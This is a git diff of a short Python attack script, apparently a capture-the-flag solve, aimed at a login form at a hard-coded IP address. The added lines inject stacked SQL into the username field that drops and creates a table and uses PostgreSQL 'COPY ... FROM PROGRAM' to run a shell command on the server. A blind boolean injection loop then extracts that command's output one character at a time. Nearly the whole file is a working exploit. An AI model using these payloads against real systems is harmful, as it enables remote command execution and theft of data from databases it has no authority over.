@@ -1,6 +1,6 @@
 import requests
 
-charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.0123456789_!@#$%^&*()}{ ,'
+charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
 flag = ''
 
 burp_url = "http://103.97.125.56:31504/"
@@ -9,11 +9,17 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
 }
 
-for index in range(1, 100):
+burp_data = {
+        "username": f"admin'; DROP TABLE IF EXISTS abc; CREATE TABLE abc(aaa text); COPY abc FROM PROGRAM 'ls / -m';--",
+        "password": "2"
+}
+response = requests.post(burp_url, data=burp_data, headers=headers)
+
+for index in range(47, 60):
     found = False
     for c in charset:
         burp_data = {
-            "username": f"DROP TABLE IF EXISTS abc; CREATE TABLE abc(aaa text); COPY abc FROM PROGRAM 'ls / -m'; OR (SELECT SUBSTRING(aaa,{index},1) FROM abc LIMIT 1) = '{c}';DROP TABLE IF EXISTS aaa;--",
+            "username": f"admin' OR (SELECT SUBSTRING(aaa,{index},1) FROM abc LIMIT 1) = '{c}';--",
             "password": "2"
         }
         print("dang test ki tu thu ",index," :",c,end="\r")
